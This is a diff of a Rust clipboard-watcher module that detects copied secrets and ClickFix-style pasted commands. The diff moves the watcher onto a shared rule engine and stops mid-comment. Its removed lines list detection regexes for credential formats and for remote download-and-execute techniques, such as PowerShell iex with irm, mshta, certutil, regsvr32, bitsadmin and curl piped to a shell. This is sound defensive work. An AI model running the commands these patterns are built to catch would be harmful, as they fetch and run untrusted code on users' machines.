@@ -5,33 +5,76 @@
 // PASTE MONITOR — credential-pattern clipboard watcher (F-1)
 // ═══════════════════════════════════════════════════════════════════════
 //
-// Background task that polls the Windows clipboard every ~750ms. On
-// content change, runs a fixed set of credential-format regexes
-// (categorised) and emits the `paste-monitor-detected` Tauri event +
-// a custom out-of-app alert on match.
+// Event-driven background task (plan §4.2 Phase 1c re-point): woken by the
+// Windows clipboard-format-change notification (`AddClipboardFormatListener`
+// / `WM_CLIPBOARDUPDATE`, via `clipboard_guard_helper::listener`), falling
+// back to a slow clipboard-sequence-number poll if that registration fails
+// — and surfacing that fallback as a health boolean, never silently (see
+// `HEALTH` below).
 //
-// Privacy guarantees:
-//   - Clipboard CONTENT never crosses the IPC boundary. The event
-//     carries only the matched pattern's display name.
+// Matching now goes through the SAME `wincmd_clip_rules` engine the fleet
+// console validates custom rules against (plan §4.1): the free-tier
+// builtin patterns are the migrated, byte-identical regex/procedural set
+// this file used to carry directly in a local `PATTERNS` array — they now
+// live in `wincmd_clip_rules::builtin` as `BuiltinPattern`, and credit-card
+// detection (which never had a regex — see the old `looks_like_credit_card`)
+// is `wincmd_clip_rules::StructuredKind::PaymentCard`. This file's own job
+// is now: (1) wrap those 32 builtins + the one structured rule into a fixed
+// `Rule` list gated by `EnabledCategories`, (2) drive the shared listener/
+// read/cooldown/report plumbing from `clipboard-guard-helper` (the crate
+// built for exactly this reuse — see its own crate doc), and (3) preserve
+// every byte of the existing toast copy and `DetectionEvent` wire shape the
+// frontend already depends on.
+//
+// This file is deliberately NOT a second, hand-rolled Win32 clipboard
+// watcher living alongside `clipboard-guard-helper`'s standalone per-user
+// process (plan §2.2/§4.2): it depends on that crate directly and drives
+// its `listener`/`read`/`engine`/`report` modules from inside this Tauri
+// process's own `tauri::async_runtime::spawn` tasks, so the two watchers
+// (this in-GUI one, and the future standalone helper) can never silently
+// diverge on what counts as a match.
+//
+// Privacy guarantees (plan §8 — content-free by construction):
+//   - Clipboard CONTENT never crosses the IPC boundary, is never logged,
+//     and never appears in the queued `ClipboardEventReport` — every field
+//     on that type is a scalar, an id, a timestamp, or a closed enum (see
+//     `wincmd_shared::fleet::ClipboardEventReport`'s own doc). A dedicated
+//     sentinel test below proves this end-to-end through this file's own
+//     match → report path, not just the wire type's shape in isolation.
 //   - SHA-256 of the clipboard content is held only in memory for
-//     change-detection between polls; nothing persists to disk.
-//   - The watcher never reads non-text clipboard formats (images, files).
+//     change-detection between events; nothing persists to disk.
+//   - The watcher never reads non-text clipboard formats (images, files)
+//     and never matches past `clipboard_guard_helper::read::
+//     MAX_CLIPBOARD_READ_BYTES` (1 MiB) — truncation happens inside the
+//     shared `read`/`engine` modules this file drives, at a UTF-8 char
+//     boundary (`wincmd_clip_rules::truncate_for_match`).
 //   - Recent-detections ring buffer holds pattern names + timestamps
 //     only — no clipboard content.
 //
+// Honest health (plan §4.2 Phase 1: "this monitor dies with the GUI —
+// report that honestly"): `get_paste_monitor_health` exposes
+// `clipboard_guard_helper::health::HelperHealth` — `listener_registered`,
+// `rules_compiled`, `policy_current`, `clear_failing`, plus this file's own
+// `helper_running`/`svc_reachable`. Folding these into
+// `capability_status::collect()` is a LATER workflow's job (`commander-pro`)
+// — see this file's handoff note for the exact key names/semantics a
+// caller there should use.
+//
 // User-controllable surface (progressive disclosure on the frontend):
 //   - Master ON/OFF toggle (already in Privacy panel).
-//   - Per-category enable/disable — 6 categories so the user can
-//     silence pattern groups they don't care about without picking
-//     individual regexes.
+//   - Per-category enable/disable — 8 categories (see `Category` below) so
+//     the user can silence pattern groups they don't care about without
+//     picking individual regexes. Toggling recompiles this file's
+//     `wincmd_clip_rules` ruleset immediately (`install_free_tier_policy`).
 //   - Snooze — temporary mute for 15 / 60 minutes when the user is
-//     legitimately handling credentials.
+//     legitimately handling credentials. Unaffected by the new per-rule
+//     cooldown below — the two are independent suppression layers.
 //   - Recent detections — last 10 in memory, surfaces "caught N this
 //     session" feedback.
 
 use std::collections::{HashMap, VecDeque};
-use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
-use std::sync::Mutex;
+use std::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering};
+use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 
 use once_cell::sync::Lazy;
@@ -40,16 +83,29 @@ use serde::{Deserialize, Serialize};
 use sha2::{Digest, Sha256};
 use tauri::{AppHandle, Emitter};
 
+use clipboard_guard_helper::actions::ActionOutcome;
+use clipboard_guard_helper::engine::{MatchEngine, MatchOutcome};
+use clipboard_guard_helper::health::HelperHealth;
+use clipboard_guard_helper::ipc::SvcClient;
+use clipboard_guard_helper::listener::{self, ClipboardChangeSource};
+use clipboard_guard_helper::policy::{ClipboardPolicyResponse, PolicyStore};
+use clipboard_guard_helper::read::{ClipboardTextSource, ReadOutcome, Win32TextSource};
+use clipboard_guard_helper::report::build_report;
+use wincmd_clip_rules::{
+    Action, BuiltinPattern, MatchKind, Rule, RuleId, Severity, StructuredKind, Verdict,
+};
+use wincmd_shared::fleet::ClipboardEventReport;
+
 // ── Categories ──────────────────────────────────────────────────────
 //
-// 6 buckets chosen to match user mental models, not pattern provenance.
-// Adding a new pattern = pick the closest category; don't add a 7th
+// 8 buckets chosen to match user mental models, not pattern provenance.
+// Adding a new pattern = pick the closest category; don't add a 9th
 // category just because the new pattern doesn't fit perfectly.
+// (Historical note: an earlier version of this comment said "6 buckets" —
+// stale even before this file's Phase 1c re-point; there have always been
+// 8 `EnabledCategories` fields.)
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
-#[allow(dead_code)] // PersonalData has no regex pattern — credit cards
-                    // are detected procedurally via looks_like_credit_card,
-                    // gated by `EnabledCategories.personal_data`.
 enum Category {
     /// AWS, Google API, SendGrid, Mailgun, Twilio, DB connection URLs.
     CloudApi,
@@ -61,7 +117,8 @@ enum Category {
     PaymentComms,
     /// PEM, OpenSSH, JWT, Bitcoin WIF — raw key material.
     KeysAndCrypto,
-    /// Credit cards.
+    /// Credit cards — `wincmd_clip_rules::StructuredKind::PaymentCard`
+    /// (Luhn-checked), not a regex. See `MatchedKind::category` below.
     PersonalData,
     /// ClickFix / pastejacking — encoded PowerShell, mshta-from-web,
     /// iex-irm, curl-pipe-shell, etc. The user did NOT copy their own
@@ -73,24 +130,6 @@ enum Category {
     /// overrides. The classic indicators that the paste isn't what it
     /// looks like.
     UnicodeAnomaly,
-}
-
-impl Category {
-    /// Two-tier severity: "warning" for credential-leak patterns
-    /// (you copied YOUR secret, don't paste it in the wrong place);
-    /// "danger" for malicious-command patterns (you copied SOMEONE
-    /// ELSE'S payload — don't paste this anywhere).
-    fn severity(self) -> &'static str {
-        match self {
-            // Bidi-override and zero-width-in-code are near-certainly
-            // hostile; mixed-script-host is high-signal phishing. All
-            // warrant the loud "danger" severity rather than "warning"
-            // so the toast copy reads with urgency.
-            Category::UnicodeAnomaly => "danger",
-            Category::MaliciousCommand => "danger",
-            _ => "warning",
-        }
-    }
 }
 
 #[derive(Debug, Clone, Copy, Serialize, Deserialize)]
@@ -147,263 +186,336 @@ impl EnabledCategories {
     }
 }
 
-// ── Pattern set ─────────────────────────────────────────────────────
+// ── Free-tier ruleset — wraps `wincmd_clip_rules` builtins, replacing the
+//    old local `PATTERNS`/`looks_like_credit_card` (plan §4.1) ──────────
 
-struct PatternDef {
-    name: &'static str,
-    category: Category,
-    re: Regex,
-}
-
-static PATTERNS: Lazy<Vec<PatternDef>> = Lazy::new(|| {
-    let mk = |name: &'static str, cat: Category, pat: &str| PatternDef {
-        name,
-        category: cat,
-        re: Regex::new(pat).expect("paste_monitor: invalid regex"),
-    };
-    vec![
-        // ── Cloud APIs ──────────────────────────────────────────────
-        mk(
-            "AWS Access Key",
-            Category::CloudApi,
-            r"\bAKIA[0-9A-Z]{16}\b",
-        ),
-        mk(
-            "Google API Key",
-            Category::CloudApi,
-            r"\bAIza[0-9A-Za-z_-]{35}\b",
-        ),
-        mk(
-            "SendGrid API Key",
-            Category::CloudApi,
-            r"\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b",
-        ),
-        mk(
-            "Mailgun API Key",
-            Category::CloudApi,
-            r"\bkey-[a-f0-9]{32}\b",
-        ),
-        mk(
-            "Twilio Account SID",
-            Category::CloudApi,
-            r"\bAC[0-9a-f]{32}\b",
-        ),
-        mk(
-            "Database URL with credentials",
-            Category::CloudApi,
-            r"\b(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp|amqps)://[^\s:/@]+:[^\s@]+@",
-        ),
-        // ── AI APIs ─────────────────────────────────────────────────
-        // OpenAI keys ship in two formats: legacy `sk-` + 48 alphanum,
-        // and the newer project-scoped `sk-proj-` + ~120 alphanum.
-        // sk-proj must come first so the legacy regex doesn't shadow it.
-        mk(
-            "OpenAI Project Key",
-            Category::AiApi,
-            r"\bsk-proj-[A-Za-z0-9_-]{40,}\b",
-        ),
-        mk("OpenAI API Key", Category::AiApi, r"\bsk-[A-Za-z0-9]{48}\b"),
-        mk(
-            "Anthropic API Key",
-            Category::AiApi,
-            r"\bsk-ant-[A-Za-z0-9_-]{20,}\b",
-        ),
-        // ── Developer Tools ─────────────────────────────────────────
-        mk(
-            "GitHub Classic Personal Token",
-            Category::DevTools,
-            r"\bgh[pousr]_[A-Za-z0-9_]{36,255}\b",
-        ),
-        mk(
-            "GitHub Fine-Grained Token",
-            Category::DevTools,
-            r"\bgithub_pat_[A-Za-z0-9_]{20,255}\b",
-        ),
-        mk("NPM Token", Category::DevTools, r"\bnpm_[A-Za-z0-9]{36}\b"),
-        // ── Payments & Comms ────────────────────────────────────────
-        mk(
-            "Stripe Live Secret",
-            Category::PaymentComms,
-            r"\bsk_live_[A-Za-z0-9]{24,}\b",
-        ),
-        mk(
-            "Stripe Live Publishable",
-            Category::PaymentComms,
-            r"\bpk_live_[A-Za-z0-9]{24,}\b",
-        ),
-        mk(
-            "Slack Token",
-            Category::PaymentComms,
-            r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b",
-        ),
-        mk(
-            "Discord Bot Token",
-            Category::PaymentComms,
-            r"\b[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}\b",
-        ),
-        // ── Keys & Crypto ───────────────────────────────────────────
-        mk(
-            "Private Key (PEM)",
-            Category::KeysAndCrypto,
-            r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY( BLOCK)?-----",
-        ),
-        mk(
-            "SSH Private Key Header",
-            Category::KeysAndCrypto,
-            r"-----BEGIN OPENSSH PRIVATE KEY-----",
-        ),
-        mk(
-            "JWT",
-            Category::KeysAndCrypto,
-            r"\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b",
-        ),
-        // Bitcoin WIF private key: starts with 5 (uncompressed) or K/L
-        // (compressed); Base58Check, no 0/O/I/l. 51 or 52 chars total.
-        mk(
-            "Bitcoin WIF Private Key",
-            Category::KeysAndCrypto,
-            r"\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b",
-        ),
-        // ── Personal Data ───────────────────────────────────────────
-        // Credit cards aren't here — handled separately because Luhn
-        // doesn't fit cleanly into the regex pipeline. See check_patterns.
-
-        // ── Malicious Commands (ClickFix / pastejacking defence) ────
-        //
-        // These patterns are the actual TTPs that "verify-you're-human"
-        // and fake-CAPTCHA pages tell users to paste into Win+R or
-        // PowerShell. False-positive rate is near zero — almost no
-        // legitimate workflow puts these strings on the clipboard.
-        //
-        // Case-insensitive on the case-significant tokens (`(?i)`)
-        // because attacker copy varies wildly: `POWERSHELL`, `PowerShell`,
-        // `pOwErShElL` all in the wild.
-
-        // Encoded PowerShell payload — `-enc <base64>`. The classic
-        // ClickFix pattern: legit-looking command, but the actual
-        // payload is base64'd to hide what it does.
-        mk(
-            "PowerShell encoded payload",
-            Category::MaliciousCommand,
-            r"(?i)\bpowershell(?:\.exe)?[^\n]*\s-(?:e|en|enc|encodedcommand)\b",
-        ),
-        // Hidden-window PowerShell — common with -enc to keep the
-        // window invisible while malware runs.
-        mk(
-            "Hidden PowerShell window",
-            Category::MaliciousCommand,
-            r"(?i)\bpowershell(?:\.exe)?[^\n]*\s-(?:w|windowstyle)\s+hidden\b",
-        ),
-        // PowerShell execution-policy bypass — almost always used to
-        // run untrusted scripts.
-        mk(
-            "PowerShell ExecutionPolicy bypass",
-            Category::MaliciousCommand,
-            r"(?i)\bpowershell(?:\.exe)?[^\n]*\s-(?:exp?|executionpolicy)\s+bypass\b",
-        ),
-        // Invoke-Expression of remote download — `iex (irm http://...)`,
-        // `iex (iwr http://...)`, `iex (New-Object Net.WebClient).DownloadString`.
-        // The malicious-payload-from-web pattern, full stop.
-        mk(
-            "PowerShell remote download + execute",
-            Category::MaliciousCommand,
-            r"(?i)\b(?:iex|invoke-expression)\b[^\n]*\b(?:irm|iwr|invoke-restmethod|invoke-webrequest|downloadstring|downloadfile|new-object\s+net\.webclient)\b",
-        ),
-        // mshta executing remote content — Microsoft HTML Application
-        // host, abused as a LOLBin to run remote .hta scripts.
-        mk(
-            "mshta web payload",
-            Category::MaliciousCommand,
-            r"(?i)\bmshta(?:\.exe)?\s+https?://",
-        ),
-        // certutil downloading a file — the canonical "abuse a Windows
-        // signed binary to fetch malware" trick.
-        mk(
-            "certutil web download",
-            Category::MaliciousCommand,
-            r"(?i)\bcertutil(?:\.exe)?\s+(?:-urlcache|-decode)\b",
-        ),
-        // regsvr32 with /i:http — fetches and executes a remote
-        // Squiblydoo-style scriptlet.
-        mk(
-            "regsvr32 web payload",
-            Category::MaliciousCommand,
-            r"(?i)\bregsvr32(?:\.exe)?\s+[^\n]*?/i:https?://",
-        ),
-        // bitsadmin transferring from web — abuses Windows BITS to
-        // fetch payloads.
-        mk(
-            "bitsadmin web transfer",
-            Category::MaliciousCommand,
-            r"(?i)\bbitsadmin(?:\.exe)?\s+/transfer\b",
-        ),
-        // curl/wget piped to shell — the *nix and cross-shell variant.
-        mk(
-            "curl/wget pipe to shell",
-            Category::MaliciousCommand,
-            r"(?i)\b(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n|]+\|\s*(?:sh|bash|zsh|ksh|fish|iex|invoke-expression|cmd|powershell)\b",
-        ),
-    ]
-});
-
-// ── Credit-card Luhn check (Category::PersonalData) ─────────────────
-
-fn looks_like_credit_card(text: &str) -> bool {
-    let mut candidates: Vec<String> = Vec::with_capacity(8);
-    let bytes = text.as_bytes();
-    let mut i = 0;
-    while i < bytes.len() && candidates.len() < 32 {
-        if bytes[i].is_ascii_digit() {
-            let start = i;
-            let mut j = i;
-            let mut digit_count = 0usize;
-            while j < bytes.len() {
-                let b = bytes[j];
-                if b.is_ascii_digit() {
-                    digit_count += 1;
-                    j += 1;
-                } else if matches!(b, b' ' | b'-') {
-                    j += 1;
-                } else {
-                    break;
-                }
-            }
-            if (13..=19).contains(&digit_count) {
-                let digits: String = text[start..j]
-                    .chars()
-                    .filter(|c| c.is_ascii_digit())
-                    .collect();
-                candidates.push(digits);
-            }
-            i = j.max(i + 1);
-        } else {
-            i += 1;
+/// Which of the 8 legacy free-tier categories a `BuiltinPattern` belongs to
+/// — i.e. which `EnabledCategories` boolean gates it. Mirrors
+/// `wincmd_clip_rules::builtin`'s own module-doc category → severity
+/// mapping exactly. That crate doesn't expose this grouping itself, since
+/// `EnabledCategories` (and the 8-bucket mental model it encodes) is a
+/// free-tier UI concept, not something the shared rule engine needs to
+/// know about.
+fn builtin_category(pattern: BuiltinPattern) -> Category {
+    use BuiltinPattern::*;
+    match pattern {
+        AwsAccessKey
+        | GoogleApiKey
+        | SendgridApiKey
+        | MailgunApiKey
+        | TwilioAccountSid
+        | DatabaseUrlWithCredentials => Category::CloudApi,
+        OpenAiProjectKey | OpenAiApiKey | AnthropicApiKey => Category::AiApi,
+        GitHubClassicToken | GitHubFineGrainedToken | NpmToken => Category::DevTools,
+        StripeLiveSecret | StripeLivePublishable | SlackToken | DiscordBotToken => {
+            Category::PaymentComms
+        }
+        PrivateKeyPem | SshPrivateKeyHeader | Jwt | BitcoinWifPrivateKey => Category::KeysAndCrypto,
+        PowershellEncodedPayload
+        | HiddenPowershellWindow
+        | PowershellExecutionPolicyBypass
+        | PowershellRemoteDownloadExecute
+        | MshtaWebPayload
+        | CertutilWebDownload
+        | Regsvr32WebPayload
+        | BitsadminWebTransfer
+        | CurlWgetPipeToShell => Category::MaliciousCommand,
+        UnicodeBidiOverride | UnicodeZeroWidthInCode | UnicodeConfusableUrlHost => {
+            Category::UnicodeAnomaly
         }
     }
-    candidates.iter().any(|d| luhn(d))
 }
 
-fn luhn(digits: &str) -> bool {
-    if digits.len() < 13 || digits.len() > 19 {
-        return false;
+/// Which concrete `wincmd_clip_rules` matcher backs one of this file's fixed
+/// free-tier rules — either a `BuiltinPattern` (regex or procedural), or the
+/// Luhn-checked `StructuredKind::PaymentCard` (credit cards never had a
+/// regex in the legacy engine — see `wincmd_clip_rules::structured`'s doc).
+/// A small wrapper enum so this file's one credit-card rule can share the
+/// exact same lookup/display/severity/category plumbing as the 32
+/// `BuiltinPattern`-backed rules.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum MatchedKind {
+    Builtin(BuiltinPattern),
+    PaymentCard,
+}
+
+impl MatchedKind {
+    /// Human-readable name for the toast/`DetectionEvent`/report — a
+    /// fixed, crate- or file-owned string, never clipboard content (see
+    /// `BuiltinPattern::display_name`'s own doc for the same invariant).
+    fn display_name(self) -> &'static str {
+        match self {
+            MatchedKind::Builtin(bp) => bp.display_name(),
+            MatchedKind::PaymentCard => "Credit Card Number",
+        }
     }
-    let mut sum = 0u32;
-    let mut alt = false;
-    for c in digits.chars().rev() {
-        let mut n = match c.to_digit(10) {
-            Some(n) => n,
-            None => return false,
+
+    /// Which `EnabledCategories` toggle gates this pattern.
+    fn category(self) -> Category {
+        match self {
+            MatchedKind::Builtin(bp) => builtin_category(bp),
+            MatchedKind::PaymentCard => Category::PersonalData,
+        }
+    }
+
+    /// The `wincmd_clip_rules::Severity` this rule should carry. Builtins
+    /// use the crate's OWN authoritative `default_severity()` (never
+    /// re-derived locally, so this file can't drift from the crate's own
+    /// category → severity mapping); the credit-card rule carries `Warn`,
+    /// matching the legacy `Category::PersonalData` tier exactly (see
+    /// `wincmd_clip_rules::structured`'s module doc: "carrying the same
+    /// Severity::Warn its Category::severity() would have given it").
+    fn severity(self) -> Severity {
+        match self {
+            MatchedKind::Builtin(bp) => bp.default_severity(),
+            MatchedKind::PaymentCard => Severity::Warn,
+        }
+    }
+}
+
+/// Map a `wincmd_clip_rules::Severity` back to the legacy two-tier string
+/// the frontend/toast copy already expects (`"warning"`/`"danger"`) — see
+/// the old `Category::severity()` this replaces. Builtins/`PaymentCard`
+/// only ever carry `Warn`/`High` (see `MatchedKind::severity`'s doc), but
+/// `Info`/`Critical` are mapped defensively rather than treated as
+/// unreachable, since a future managed/custom rule could carry them.
+fn severity_label(severity: Severity) -> &'static str {
+    match severity {
+        Severity::Warn => "warning",
+        Severity::High => "danger",
+        Severity::Info => "warning",
+        Severity::Critical => "danger",
+    }
+}
+
+/// The fixed free-tier pattern list, in the LEGACY engine's exact
+/// evaluation order: the 29 original `PATTERNS` entries (in their original
+/// declaration order), then the credit-card check, then the 3 unicode
+/// sub-checks — exactly the order `check_patterns`/`check_unicode_anomaly`
+/// used to check them in (PATTERNS loop first, credit card only if that
+/// found nothing, unicode only if THAT found nothing too).
+///
+/// This order is not cosmetic: `build_free_tier_rules` below assigns each
+/// entry a `priority` that strictly DECREASES down this list, so that if a
+/// clipboard string happens to satisfy more than one of these 33 rules at
+/// once (a real case — e.g. an OpenSSH PEM header also satisfies the
+/// generic `PrivateKeyPem` alternation), `CompiledRuleSet::evaluate`'s
+/// "highest priority wins" rule reproduces the legacy engine's "first
+/// pattern in the fixed list that matches wins" behaviour exactly, instead
+/// of picking an arbitrary one.
+const FREE_TIER_PATTERNS: &[MatchedKind] = &[
+    // ── Cloud APIs ──────────────────────────────────────────────────
+    MatchedKind::Builtin(BuiltinPattern::AwsAccessKey),
+    MatchedKind::Builtin(BuiltinPattern::GoogleApiKey),
+    MatchedKind::Builtin(BuiltinPattern::SendgridApiKey),
+    MatchedKind::Builtin(BuiltinPattern::MailgunApiKey),
+    MatchedKind::Builtin(BuiltinPattern::TwilioAccountSid),
+    MatchedKind::Builtin(BuiltinPattern::DatabaseUrlWithCredentials),
+    // ── AI APIs ─────────────────────────────────────────────────────
+    MatchedKind::Builtin(BuiltinPattern::OpenAiProjectKey),
+    MatchedKind::Builtin(BuiltinPattern::OpenAiApiKey),
+    MatchedKind::Builtin(BuiltinPattern::AnthropicApiKey),
+    // ── Developer Tools ─────────────────────────────────────────────
+    MatchedKind::Builtin(BuiltinPattern::GitHubClassicToken),
+    MatchedKind::Builtin(BuiltinPattern::GitHubFineGrainedToken),
+    MatchedKind::Builtin(BuiltinPattern::NpmToken),
+    // ── Payments & Comms ────────────────────────────────────────────
+    MatchedKind::Builtin(BuiltinPattern::StripeLiveSecret),
+    MatchedKind::Builtin(BuiltinPattern::StripeLivePublishable),
+    MatchedKind::Builtin(BuiltinPattern::SlackToken),
+    MatchedKind::Builtin(BuiltinPattern::DiscordBotToken),
+    // ── Keys & Crypto ───────────────────────────────────────────────
+    MatchedKind::Builtin(BuiltinPattern::PrivateKeyPem),
+    MatchedKind::Builtin(BuiltinPattern::SshPrivateKeyHeader),
+    MatchedKind::Builtin(BuiltinPattern::Jwt),
+    MatchedKind::Builtin(BuiltinPattern::BitcoinWifPrivateKey),
+    // ── Malicious Commands (ClickFix / pastejacking defence) ────────
+    MatchedKind::Builtin(BuiltinPattern::PowershellEncodedPayload),
+    MatchedKind::Builtin(BuiltinPattern::HiddenPowershellWindow),
+    MatchedKind::Builtin(BuiltinPattern::PowershellExecutionPolicyBypass),
+    MatchedKind::Builtin(BuiltinPattern::PowershellRemoteDownloadExecute),
+    MatchedKind::Builtin(BuiltinPattern::MshtaWebPayload),
+    MatchedKind::Builtin(BuiltinPattern::CertutilWebDownload),
+    MatchedKind::Builtin(BuiltinPattern::Regsvr32WebPayload),
+    MatchedKind::Builtin(BuiltinPattern::BitsadminWebTransfer),
+    MatchedKind::Builtin(BuiltinPattern::CurlWgetPipeToShell),
+    // ── Personal Data (credit card — Luhn, not a regex) ─────────────
+    MatchedKind::PaymentCard,
+    // ── Unicode anomalies — procedural `BuiltinPattern` variants ────
+    MatchedKind::Builtin(BuiltinPattern::UnicodeBidiOverride),
+    MatchedKind::Builtin(BuiltinPattern::UnicodeZeroWidthInCode),
+    MatchedKind::Builtin(BuiltinPattern::UnicodeConfusableUrlHost),
+];
+
+/// Cooldown applied to every free-tier builtin/structured rule (plan
+/// §4.1/§4.2: "per-rule cooldown via `CooldownLedger`, replacing reliance
+/// on the global snooze alone"). 30s is a deliberate choice, not a value
+/// carried over from the legacy engine (which had no per-rule cooldown at
+/// all — only the global snooze): long enough that a quick burst of
+/// distinct-but-related secrets (e.g. rotating through a few AWS keys
+/// while cleaning up a shared doc) folds into one toast + a suppressed
+/// count instead of an alert storm, short enough that a genuinely new,
+/// unrelated paste of the same pattern minutes later still gets its own
+/// toast. The global snooze (`SNOOZE_UNTIL`) is unaffected and keeps
+/// working exactly as before — this is an ADDITIONAL, finer-grained
+/// suppression layer, not a replacement.
+const FREE_TIER_COOLDOWN_SECONDS: u32 = 30;
+
+/// `ClipboardPolicyResponse.policy_version` this file installs its own
+/// fixed builtin/structured ruleset under. `0` is the same "nothing
+/// managed installed yet" sentinel `clipboard_guard_helper::policy::
+/// PolicyStore`'s own empty starting policy uses — appropriate here too,
+/// since Free's own local ruleset is not a Fleet-signed epoch (that's the
+/// separate `svc.policy.install_epoch` path — `settings.rs::
+/// handle_clipboard_guard_epoch_subtrees`). If a managed epoch's
+/// clipboard-guard subtree is ever merged with this file's own builtins in
+/// a later phase, this constant is the one place that would need to change.
+const FREE_TIER_POLICY_VERSION: i64 = 0;
+
+/// Deterministic, process-local `RuleId` for the free-tier pattern at
+/// `index` in [`FREE_TIER_PATTERNS`]. These ids exist only to give
+/// `CooldownLedger`/`Verdict` a per-pattern identity within this running
+/// process — they are NOT Fleet-authored rule ids, are never persisted
+/// across restarts, and their stability across app versions doesn't
+/// matter (only uniqueness across this fixed ~33-entry set does).
+/// `RuleId::new` validates SHAPE only (32 lowercase hex chars), which a
+/// zero-padded index trivially satisfies.
+fn free_rule_id(index: u8) -> RuleId {
+    RuleId::new(format!("{index:032x}"))
+        .expect("free_rule_id: a zero-padded u8 index always produces a valid 32-hex RuleId")
+}
+
+/// Build this file's fixed free-tier ruleset for the given category
+/// toggles, plus a `RuleId → MatchedKind` lookup so a later `Verdict` can
+/// be turned back into a display name/severity for the toast and
+/// `DetectionEvent`. Disabled categories are NOT omitted from the list —
+/// their rules are simply built with `enabled: false`, which
+/// `wincmd_clip_rules::compile()` skips entirely (never compiled, never
+/// counted against limits) — this is what makes `EnabledCategories`
+/// toggling a cheap, always-successful recompile rather than a structural
+/// change to the rule set.
+fn build_free_tier_rules(enabled: &EnabledCategories) -> (Vec<Rule>, HashMap<RuleId, MatchedKind>) {
+    let total = FREE_TIER_PATTERNS.len();
+    let mut rules = Vec::with_capacity(total);
+    let mut lookup = HashMap::with_capacity(total);
+
+    for (index, &kind) in FREE_TIER_PATTERNS.iter().enumerate() {
+        let id = free_rule_id(index as u8);
+        let matcher = match kind {
+            MatchedKind::Builtin(bp) => MatchKind::Builtin(bp),
+            MatchedKind::PaymentCard => MatchKind::Structured(StructuredKind::PaymentCard),
         };
-        if alt {
-            n *= 2;
-            if n > 9 {
-                n -= 9;
-            }
-        }
-        sum += n;
-        alt = !alt;
+        rules.push(Rule {
+            id: id.clone(),
+            revision: 1,
+            name: kind.display_name().to_string(),
+            enabled: enabled.allows(kind.category()),
+            // Strictly decreasing by declaration order — see
+            // `FREE_TIER_PATTERNS`'s doc comment for why this exact
+            // tie-break matters.
+            priority: (total - index) as u16,
+            matcher,
+            severity: kind.severity(),
+            // `ReportFleet` here means "queue a content-free event toward
+            // the check-in envelope" (plan §4.2 item 5) — see
+            // `handle_emit`'s doc for the honest caveat about what actually
+            // happens to that attempt today.
+            actions: vec![Action::NotifyUser, Action::ReportFleet],
+            cooldown_seconds: FREE_TIER_COOLDOWN_SECONDS,
+            snoozable: true,
+            // Free-tier builtins aren't user-editable (no custom rule
+            // editor on this tier) — `locked` is a hint for a future
+            // authoring UI, not enforced by `wincmd_clip_rules` itself.
+            locked: true,
+        });
+        lookup.insert(id, kind);
     }
-    sum.is_multiple_of(10)
+
+    (rules, lookup)
+}
+
+/// (Re)compile this file's free-tier ruleset for the given category
+/// toggles and install it as the active policy, updating the `rules_
+/// compiled`/`policy_current` health flags honestly either way. Called
+/// once at watcher start and again every time `EnabledCategories` change.
+/// The free-tier ruleset is small (≤ `RuleSetLimits::default()
+/// .max_enabled_rules`, currently 33 « 100) and fixed, so a compile
+/// failure here would indicate a bug in this file, not user input — but
+/// this function still treats it as a normal, recoverable outcome (never
+/// panics), exactly like `clipboard_guard_helper::policy::PolicyStore::
+/// install`'s own atomic-install-with-last-valid-retention contract.
+fn install_free_tier_policy(enabled: &EnabledCategories) {
+    let (rules, lookup) = build_free_tier_rules(enabled);
+    let response = ClipboardPolicyResponse {
+        policy_version: FREE_TIER_POLICY_VERSION,
+        rules,
+    };
+
+    let mut store = POLICY.lock().unwrap();
+    let result = store.install(&response);
+    let rules_compiled = store.rules_compiled();
+    drop(store);
+
+    *RULE_LOOKUP.lock().unwrap() = lookup;
+
+    {
+        let mut health = HEALTH.lock().unwrap();
+        health.rules_compiled = rules_compiled;
+        health.policy_current = result.is_ok();
+    }
+
+    if let Err(errors) = result {
+        crate::log_message(
+            "warn",
+            &format!(
+                "[PasteMonitor] free-tier ruleset failed to compile ({} error(s)); keeping previous ruleset",
+                errors.len()
+            ),
+        );
+    }
+}
+
+// ── Toast copy (byte-identical to the legacy engine) ─────────────────
+
+/// Build the notification title/body for one detection. Extracted
+/// verbatim from the old inline logic so it (a) is unit-testable without a
+/// real `AppHandle`/notification plumbing, and (b) can never drift subtly
+/// during the Phase 1c re-point — this is the exact copy users already
+/// see, and the task's constraint is that it must not change.
+fn detection_copy(pattern: &str, severity: &str) -> (&'static str, String) {
+    let is_powershell = pattern.to_ascii_lowercase().contains("powershell")
+        || pattern.to_ascii_lowercase().contains("encodedcommand")
+        || pattern.to_ascii_lowercase().contains("executionpolicy")
+        || pattern.to_ascii_lowercase().contains("pwsh");
+
+    if severity == "danger" && is_powershell {
+        (
+            "WinCommander · Dangerous PowerShell command",
+            format!(
+                "Clipboard contains a PowerShell-style payload ({}). \
+                Do not paste it into Win+R, Terminal, or PowerShell unless you wrote it yourself.",
+                pattern
+            ),
+        )
+    } else if severity == "danger" {
+        (
+            "WinCommander · Suspicious clipboard content",
+            format!(
+                "You copied something that looks like a malware payload ({}). \
+                Do not paste this into Win+R, PowerShell, or any terminal. \
+                This is the ClickFix / pastejacking trick.",
+                pattern
+            ),
+        )
+    } else {
+        (
+            "WinCommander · Paste Monitor",
+            format!(
+                "Looks like you copied a {} — be careful where you paste it.",
+                pattern
+            ),
+        )
+    }
 }
 
 // ── Crypto-address swap detection (paid extension) ──────────────────
@@ -423,6 +535,12 @@ fn luhn(digits: &str) -> bool {
 //
 // Privacy invariant: we never log or emit the actual address. The event
 // payload only says "Crypto Address Swap detected (Bitcoin)".
+//
+// This entire section is UNCHANGED by the Phase 1c re-point — it is a
+// paid-tier feature with no equivalent in `wincmd_clip_rules` (which only
